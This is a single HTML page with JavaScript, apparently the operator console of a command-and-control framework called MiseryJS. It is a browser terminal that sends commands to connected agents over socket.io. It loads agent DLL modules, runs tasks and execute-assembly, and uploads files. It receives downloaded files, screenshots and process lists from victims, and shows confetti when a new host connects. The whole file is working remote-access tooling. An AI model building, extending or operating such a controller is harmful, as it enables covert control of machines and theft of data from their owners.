<!DOCTYPE html>
<html>
<head>
<title>MiseryJS</title>
<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://code.jquery.com/ui/1.13.2/jquery-ui.js"></script>
<link rel="stylesheet" href="//code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css">
<script src="https://unpkg.com/jquery.terminal/js/jquery.terminal.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/js-confetti@latest/dist/js-confetti.browser.js"></script>
<link rel="stylesheet" href="https://unpkg.com/jquery.terminal/css/jquery.terminal.min.css"/>
<script src="/socket.io/socket.io.js"></script>
<style>
    .current-connection{
        background-color: #005497 !important;
        color: #d6d6d6;
    }
    .terminal img {
        max-width: 100%;
    }
    .ui-tabs-panel {
        flex: 100;
        overflow-x: scroll;
    }
</style>
</head>
<body style="display: flex; height: 100%; margin: 0;">
    <input type="file" id="file" name="file" multiple style="display:none">
    <div style="width: 50%" class="cli"></div>
    <div id="tabs" style="flex: 50; display: flex; flex-direction: column; padding: 0">
        <div id="tabs-1" style="letter-spacing: 1.25px; padding: 16px; background-color: #9c9c9c; overflow-y: scroll;" class="connections"></div>
        <ul>
            <li><a href="#tabs-1">Connections</a></li>
        </ul>
    </div>
    <script>
        var currentId = "";
        var socket = null;
        var cCount = 0;
        var commands = {};
        var terminal = null;

        var tabs = $( "#tabs" ).tabs();
        tabs.on( "click", "span.ui-icon-close", function() {
            var panelId = $( this ).closest( "li" ).remove().attr( "aria-controls" );
            $( "#" + panelId ).remove();
            tabs.tabs( "refresh" );
        });
        var tabCounter = 2;
        var tabTemplate = "<li><a href='#{href}'>#{label}</a> <span class='ui-icon ui-icon-close' role='presentation'>Remove Tab</span></li>";


        $.getJSON("commands.json", json => {
            Object.keys(json).forEach(c => commands[c] = (...args) => {
                var alias = json[c];

                if(['-h', '-help'].includes(args[0])){
                    terminal.echo("[[b;white;black]" + alias.summary + "]");
                    terminal.echo("[[b;cornflowerblue;black]" + alias.usage + "]");
                    return;
                }

                if(alias.depends && alias.depends.length){
                    terminal.exec(`load agent/modules/${alias.depends}/${alias.depends}.dll`, true)
                }

                if(alias.transforms){
                    alias.transforms.forEach(transform => {
                        if(transform == 'file_select'){
                            var fileInput = $('#file');
                            var hasSent = false;
                            fileInput[0].addEventListener('input', file => {
                                if(hasSent) return;
                                hasSent = true;
                                var reader = new FileReader();
                                reader.readAsDataURL(fileInput[0].files[0]);
                                
                                reader.onload = () => {
                                    args[9] = reader.result.split('base64,')[1];
                                    fileInput[0].value = '';
                                    runAlias(alias, args);
                                };
                                
                            });
                            fileInput.trigger('click');
                        }
                    });
                    return
                }
                runAlias(alias, args);
                
            });
            createTerminal();
        });

        function runAlias(alias, args){
            if(alias.agent_alias && alias.agent_alias.length){
                alias.agent_alias.forEach(com => {
                    com = com.replace(/\{[0-9]\}/gi, p => args[+p[1]]);
                    terminal.exec(com, true)
                });
            }
        }

        function createTerminal(){
            terminal = $('div.cli').terminal({
                login: (username, password) => {
                    if(socket){
                        this.echo("connection already exists");
                        return;
                    }
                    socket = io({auth: {token: password}});
                    initializeSocket();
                },
                echo: message => {
                    if(noConnection()) return;
                    socket.emit('echo', {id: currentId, message});
                },  
                exit: message => {
                    if(noConnection()) return;
                    socket.emit('exit', {id: currentId});
                },  
                load: message => {
                    if(noConnection()) return;
                    socket.emit('load', {id: currentId, fileName: message});
                },
                run: function(...args) {
                    if(noConnection()) return;
                    socket.emit('run-task', {id: currentId, args: args.map(a => a.toString())});
                },
                execute_assembly: function(...args) {
                    if(noConnection()) return;
                    socket.emit('execute-assembly', {id: currentId, args: args.map(a => a.toString())});
                },
                ...commands
            }, {
                completion: true,            
                checkArity: false,
                greetings: 'Welcome to misery controller'
            });
            $('div.cli').resizable({ handles: 'e' });
        }

        function noConnection(){
            if(!socket){
                terminal.echo("no connection");
            }
            return !socket;
        }

        function b64toBlob(b64Data, contentType='image/jpeg', sliceSize=512){
            const byteCharacters = atob(b64Data);
            const byteArrays = [];

            for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
                const slice = byteCharacters.slice(offset, offset + sliceSize);

                const byteNumbers = new Array(slice.length);
                for (let i = 0; i < slice.length; i++) {
                    byteNumbers[i] = slice.charCodeAt(i);
                }

                const byteArray = new Uint8Array(byteNumbers);
                byteArrays.push(byteArray);
            }

            return new Blob(byteArrays, {type: contentType});
        }

        function initializeSocket(){

            socket.on("disconnect", () => {
                terminal.echo('connection failed');
                socket = null;
            });

            socket.on("echo", message => {
                if(message.returnType == null){
                    terminal.echo(`[[b;white;black]${$.terminal.escape_brackets(message)}]`);
                }else if(message.returnType == 0){
                    terminal.echo(`[[b;white;black]${$.terminal.escape_brackets(message.output)}]`);
                }else if(message.returnType == 1){
                    const linkSource = `data:application/octet-stream;base64,${message.output}`
                    const downloadLink = document.createElement('a');
                    document.body.appendChild(downloadLink);

                    downloadLink.href = linkSource;
                    downloadLink.target = '_self';
                    downloadLink.download = currentId + Math.floor(Math.random() * 1000);
                    downloadLink.click(); 
                }else if(message.returnType == 2){
                    const str2blob = b64toBlob(message.output);
                    var imageUrl = URL.createObjectURL(str2blob);
                    const img = $(`<img src="${imageUrl}">`);
                    terminal.echo(img);
                }else if(message.returnType == 3){
                    terminal.echo(`[[b;white;black]${$.terminal.escape_brackets(message.output)}]`);
                }else if(message.returnType == 4){
                    var label = "Processes",
                    id = "tabs-" + tabCounter,
                    li = $( tabTemplate.replace( /#\{href\}/g, "#" + id ).replace( /#\{label\}/g, label ) ),
                    tabContentHtml = message.output;
                    
                    tabs.find( ".ui-tabs-nav" ).append( li );
                    tabs.prepend( "<div id='" + id + "'><p>" + tabContentHtml + "</p></div>" );
                    tabs.tabs( "refresh" );
                    
                    tabCounter++;
                }
            });

            socket.on("connections", connections => {

                if(cCount < connections.length){
                    const jsConfetti = new JSConfetti();
                    jsConfetti.addConfetti();
                }
                cCount = connections.length;

                $("div.connections").html(connections.length + " open connections");

                connections.forEach(element => {
                    var contentString = "";
                    Object.keys(element).forEach(p => {
                        contentString += `<div style="padding-bottom: 4px; overflow-wrap: anywhere"><span style="text-transform: capitalize">${p}: </span>${element[p]}</div>`
                    });
                    contentString += 
                    $("div.connections").append(`<div class="connection-button" id="${element.id}"
                    style="padding: 16px; background-color: whitesmoke; font-size: 12px; cursor: pointer; border-radius: 5px;
                    box-shadow: darkgrey 2px 3px 8px -4px; margin-top: 16px;">${contentString}</div>`);
                });
                $("div.connection-button").click(function(){

                    if(currentId && currentId.length) $(`#${currentId}`).removeClass("current-connection");
                    currentId = this.id;
                    $(`#${currentId}`).addClass("current-connection");
                    terminal.set_prompt(currentId + "[[gb;red;black]>] ");
                });

                if(currentId)  $(`#${currentId}`).addClass("current-connection");

            });
        }
        </script>
</body>
</html>